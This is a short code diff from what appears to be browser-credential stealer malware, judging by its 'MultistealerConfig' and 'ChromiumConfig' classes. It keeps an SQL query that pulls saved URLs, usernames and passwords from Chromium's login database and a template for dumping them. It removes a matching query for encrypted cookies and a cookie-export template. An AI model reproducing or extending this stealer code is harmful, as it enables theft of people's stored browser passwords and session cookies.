@@ -19,9 +19,7 @@ class Browsers(Enum):
 
 class ChromiumConfig:
     PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
-    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
     PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
-    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
 
 
 class MultistealerConfig:
